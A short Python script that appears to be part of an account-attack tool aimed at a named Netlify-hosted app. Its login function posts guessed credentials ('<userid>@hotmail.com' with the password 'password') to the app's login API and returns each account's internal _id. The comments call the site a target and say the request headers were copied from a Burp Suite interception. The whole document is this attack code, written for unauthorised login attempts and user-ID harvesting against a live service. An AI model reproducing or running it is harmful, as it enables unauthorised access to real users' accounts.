import requests
import json

# omitting these for obvious reasons.
# if you set up a target, you can find this information by using burpsuite
HOST = '{INSERT HOST NAME HERE}'
REFERER = '{INSERT REFERER NAME HERE}'
ORIGIN = '{INSERT ORIGIN NAME HERE}'

def login(userid):
    # headers derived from burpsuite interception, using burpsuite custom chromium browser
    headers = {
        'Host': f'{HOST}',
        'Content-Length': '52',
        'Sec-Ch-Ua': '"Chromium";v="103", ".Not/A)Brand";v="99"',
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'Sec-Ch-Ua-Mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Origin': f'{ORIGIN}',
        'Sec-Fetch-Site': 'same-origin', 
        'Sec-Fetch-Mode': 'cors', 
        'Sec-Fetch-Dest': 'empty', 
        'Referer': f'{REFERER}', 
        'Accept-Encoding': 'gzip, deflate', 
        'Accept-Language': 'en-US,en;q=0.9',
        }

    data = f'{{"email":"{userid}@hotmail.com","password":"password"}}'

    response = requests.post('https://bruinodyssey.netlify.app/api/user/login', headers=headers, data=data)

    response_dict = json.loads(response.content)
    # print(response_dict)
    return response_dict["user"]["_id"]
